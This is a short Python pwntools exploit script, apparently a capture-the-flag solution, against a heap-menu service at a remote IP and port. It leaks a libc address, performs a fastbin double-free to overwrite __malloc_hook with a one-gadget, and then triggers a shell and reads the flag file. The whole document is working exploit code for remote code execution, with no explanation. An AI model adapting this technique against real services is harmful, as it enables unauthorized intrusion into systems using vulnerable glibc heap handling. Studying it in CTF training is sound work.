#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
l = ELF( './libc-2.23.so' )
host , port = '60.251.236.18' , 10007
y = remote( host , port )

def add( size , data ):
    y.sendafter( '>' , '1' )
    y.sendafter( ':' , str( size ) )
    y.sendafter( ':' , data )

def sho( idx ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , str( idx ) )

def dle( idx ):
    y.sendafter( '>' , '3' )
    y.sendafter( ':' , str( idx ) )


add( 0x500 , 'a' )
add( 0x18 , 'a' )
dle( 0 )
sho( 0 )
l.address = u64( y.recv(6) + '\0\0' ) - 0x3c4b78
success( 'libc -> %s' % hex( l.address ) )

add( 0x68 , 'a' )
add( 0x68 , 'a' )
dle( 2 )
dle( 3 )
dle( 2 )

add( 0x68 , p64( l.sym.__malloc_hook - 0x10 - 3 ) )
add( 0x68 , 'a' )
add( 0x68 , 'a' )
add( 0x68 , 'y' * 3 + p64( l.address + 0xf02a4 ) )

dle( 0 )
dle( 0 )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()